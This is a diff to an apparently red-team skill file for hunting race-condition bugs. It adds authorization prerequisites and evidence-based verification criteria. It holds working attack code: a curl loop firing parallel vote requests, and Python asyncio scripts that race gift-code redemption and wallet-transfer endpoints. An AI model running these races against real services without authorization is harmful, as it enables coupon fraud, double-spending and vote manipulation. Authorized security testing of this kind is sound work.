@@ -4,9 +4,40 @@ description: Hunting skill for race condition vulnerabilities. Built from 12 pub
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [race-condition, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [race-condition, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting race conditions, TOCTOU bugs, MFA-bypass-via-timing.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Fire 15 simultaneous vote/redeem requests
+for i in $(seq 1 15); do
+  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}\n" \
+    -X POST "https://target.com/api/vote" \
+    -H "Cookie: session=YOUR_SESSION" \
+    -H "Content-Type: application/json" \
+    -d '{"report_id": "12345", "vote": "up"}' &
+done
+wait
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -140,11 +171,11 @@ async def main():
     url = "https://target.com/redeem"
     payload = {"code": "GIFT50"}
     headers = {"Cookie": "session=XXXXX"}
-    
+
     async with aiohttp.ClientSession() as session:
         tasks = [race_request(session, url, payload, headers) for _ in range(20)]
         results = await asyncio.gather(*tasks)
-    
+
     for r in results:
         print(r[:100])  # print first 100 chars of each response
 
@@ -532,7 +563,7 @@ def handleResponse(req, interesting):
 
 ```python
 # turbo_multi_endpoint.py
-# Use against: wallet transfer (withdraw-to-A + deposit-to-B), 
+# Use against: wallet transfer (withdraw-to-A + deposit-to-B),
 #              balance-confirm race, double-spend across endpoints
 # Strategy: Race two different endpoints that share state (common in fintech).
 # Queue requests in alternating order so they arrive simultaneously.
@@ -706,35 +737,19 @@ See: https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-
 
 ---
 
-## Verification
-
-Run this self-test to confirm race-condition hunting readiness:
-
-1. **Skill integrity** — confirm the skill file is readable and well-formed:
-   ```bash
-   grep -q "name: hunt-race-condition" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
-   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
-   ```
-
-2. **Category check** — confirm the skill has a category:
-   ```bash
-   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
-   ```
-
-3. **Pitfalls section** — confirm pitfalls are documented:
-   ```bash
-   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
-   ```
-
-All 3 tests verify the skill is properly structured and ready for use.
-
----
-
 ## Pitfalls
 - **Single-threaded testing** — race conditions require parallel requests. Curl alone can't demonstrate them reliably. Use Python `asyncio` or Burp Intruder with multiple threads.
 - **TOCTOU without state change** — time-of-check-time-of-use is theoretical without demonstrating the state changed between check and use.
 - **Race window too small** — if the window between check and use is microseconds, the race may be impractical. Measure the window before reporting.
 - **Limit-overrun race** — coupon/credit/withdrawal races are the highest-impact. Test with exact parallel requests, not just rapid sequential.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
